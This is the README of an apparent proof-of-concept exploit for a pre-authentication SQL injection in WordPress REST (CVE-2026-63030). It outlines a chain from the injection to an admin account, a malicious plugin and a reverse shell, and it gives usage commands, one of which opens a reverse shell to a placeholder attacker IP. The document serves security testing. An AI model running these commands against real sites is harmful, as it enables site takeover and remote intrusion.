# CVE-2026-63030 — wp2shell

PoC de SQLi pré-autenticação por confusão de rota no endpoint `batch/v1` do
WordPress REST (wp2shell). SQLi cega → administrador → plugin → reverse shell.

- Confusão de rota + SQLi: Adam Kues (Assetnote / Searchlight Cyber)
- Implementação original: x34ElSatan

Afetados: 6.9.0–6.9.4, 7.0.0–7.0.1.

## Uso

    python3 wp2shell.py https://alvo.com
    python3 wp2shell.py https://alvo.com --shell SEU_IP 4444

## Disclaimer

Uso apenas em testes de segurança autorizados.
